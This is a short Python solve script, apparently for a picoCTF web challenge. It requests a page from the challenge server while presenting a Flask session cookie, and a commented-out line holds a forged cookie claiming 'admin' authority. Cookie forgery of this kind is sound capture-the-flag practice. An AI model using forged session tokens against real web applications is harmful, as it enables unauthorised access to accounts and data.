import requests

res = requests.get('http://mercury.picoctf.net:35697/display',
        cookies={'session': 'eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YtUkpw.vZjrMBHUjAvAqOY3iXUTUviRYyY'},
        # cookies={'session': 'eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YtUmUA.R5qk-9iJ8mUl9U4GEgRPr411BcU'},
        headers={
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "ja,en-US;q=0.9,en;q=0.8",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Host": "mercury.picoctf.net:35697",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
            },
        allow_redirects=False
        )
print(res.text)
# "Cookie": "session=eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YtUkpw.vZjrMBHUjAvAqOY3iXUTUviRYyY",
